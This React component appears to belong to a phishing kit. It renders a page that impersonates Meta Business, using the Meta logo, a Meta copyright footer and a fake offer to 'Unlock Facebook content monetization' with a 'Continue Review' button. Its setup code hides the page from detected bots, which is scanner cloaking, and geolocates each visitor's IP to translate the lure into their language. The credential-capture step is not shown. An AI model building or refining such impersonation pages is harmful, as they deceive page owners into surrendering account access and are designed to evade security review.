import { useCallback, useEffect, useMemo, useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router';
import MetaLogo from '@/assets/images/metalogo.svg';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import detectBot from '@/utils/detect_bot';
import { translateText } from '@/utils/translate';

const Index = () => {
    const navigate = useNavigate();
    const [translatedTexts, setTranslatedTexts] = useState({});
    const [isLoading, setIsLoading] = useState(true);

    const defaultTexts = useMemo(
        () => ({
            title: 'Unlock Facebook content monetization for your page',
            description: 'You may be eligible to activate Facebook content monetization and start earning from your audience. Complete the review process to access monetization tools, strengthen your creator presence, and grow revenue with Meta.',
            cta: 'Continue Review',
            sectionTitle: 'Turn your content into earnings',
            sectionDescription: 'Access monetization tools, build credibility with your audience, and move one step closer to earning from your content.',
            footerTop: 'You received this message because your page may be eligible for Facebook content monetization.',
            footerBottom: '© 2026 Meta · All rights reserved'
        }),
        []
    );

    const translateAllTexts = useCallback(
        async (targetLang) => {
            const keys = Object.keys(defaultTexts);
            const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
            const translated = {};

            keys.forEach((key, index) => {
                translated[key] = translations[index];
            });

            setTranslatedTexts(translated);
            document.documentElement.lang = targetLang;
        },
        [defaultTexts]
    );

    useEffect(() => {
        const initializeApp = async () => {
            try {
                const botResult = await detectBot();
                if (botResult.isBot) {
                    return;
                }

                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                const data = response.data;

                localStorage.setItem('ipInfo', JSON.stringify(data));

                const countryCode = (data?.country_code || '').toUpperCase();
                const targetLang = countryToLanguage[countryCode] || 'en';

                localStorage.setItem('targetLang', targetLang);

                if (targetLang !== 'en') {
                    await translateAllTexts(targetLang);
                } else {
                    setTranslatedTexts(defaultTexts);
                    document.documentElement.lang = 'en';
                }
            } catch {
                setTranslatedTexts(defaultTexts);
                document.documentElement.lang = 'en';
            } finally {
                setIsLoading(false);
            }
        };

        document.title = 'Meta Business';
        initializeApp();
    }, [defaultTexts, translateAllTexts]);

    if (isLoading) {
        return null;
    }

    const texts = Object.keys(translatedTexts).length ? translatedTexts : defaultTexts;

    return (
        <div
            style={{
                margin: 0,
                minHeight: '100vh',
                display: 'flex',
                alignItems: 'flex-start',
                justifyContent: 'center',
                padding: '18px 12px 20px',
                color: '#1c2b33',
                fontFamily: 'Segoe UI, Arial, Helvetica, sans-serif',
                background: 'linear-gradient(135deg, rgb(250, 233, 239), rgb(217, 234, 250), rgb(222, 249, 234))',
                boxSizing: 'border-box'
            }}
        >
            <div style={{ width: '100%', maxWidth: '600px', textAlign: 'center', boxSizing: 'border-box' }}>
                <section
                    style={{
                        minHeight: '499px',
                        borderRadius: '18px',
                        textAlign: 'left',
                        padding: '28px 18px 18px',
                        display: 'flex',
                        flexDirection: 'column',
                        boxShadow: '0 8px 28px rgba(34,70,112,0.08)',
                        boxSizing: 'border-box',
                        background: 'rgba(255, 255, 255, 0.72)'
                    }}
                >
                    <img src={MetaLogo} alt='Meta logo' style={{ width: '64px', height: 'auto', marginBottom: '14px', boxSizing: 'border-box' }} loading='lazy' />
                    <h1
                        style={{
                            margin: '0 0 14px',
                            fontFamily: 'Segoe UI, Arial, Helvetica, sans-serif',
                            fontSize: 'clamp(30px, 9.2vw, 50px)',
                            lineHeight: 1.04,
                            letterSpacing: '-0.4px',
                            fontWeight: 700,
                            textWrap: 'balance',
                            boxSizing: 'border-box'
                        }}
                    >
                        {texts.title}
                    </h1>
                    <p
                        style={{
                            margin: 0,
                            fontSize: '13px',
                            lineHeight: 1.5,
                            color: '#2d3b47',
                            boxSizing: 'border-box'
                        }}
                    >
                        {texts.description}
                    </p>
                    <button
                        type='button'
                        onClick={() => navigate(PATHS.HOME)}
                        style={{
                            marginTop: '18px',
                            display: 'block',
                            alignSelf: 'stretch',
                            border: 0,
                            borderRadius: '999px',
                            background: '#145dc6',
                            color: '#fff',
                            fontWeight: 700,
                            fontSize: '12.5px',
                            padding: '10px 34px',
                            textAlign: 'center',
                            cursor: 'pointer',
                            boxSizing: 'border-box'
                        }}
                    >
                        {texts.cta}
                    </button>
                    <div
                        style={{
                            marginTop: '24px',
                            fontWeight: 700,
                            fontSize: '14px',
                            lineHeight: 1.3,
                            boxSizing: 'border-box'
                        }}
                    >
                        {texts.sectionTitle}
                    </div>
                    <div
                        style={{
                            marginTop: '6px',
                            fontSize: '13px',
                            lineHeight: 1.5,
                            color: '#1f2f3f',
                            boxSizing: 'border-box'
                        }}
                    >
                        {texts.sectionDescription}
                    </div>
                </section>
                <div
                    style={{
                        marginTop: '12px',
                        fontSize: '10.5px',
                        color: '#5f6d79',
                        lineHeight: 1.3,
                        boxSizing: 'border-box'
                    }}
                >
                    <div>{texts.footerTop}</div>
                    <div>{texts.footerBottom}</div>
                </div>
            </div>
        </div>
    );
};

export default Index;
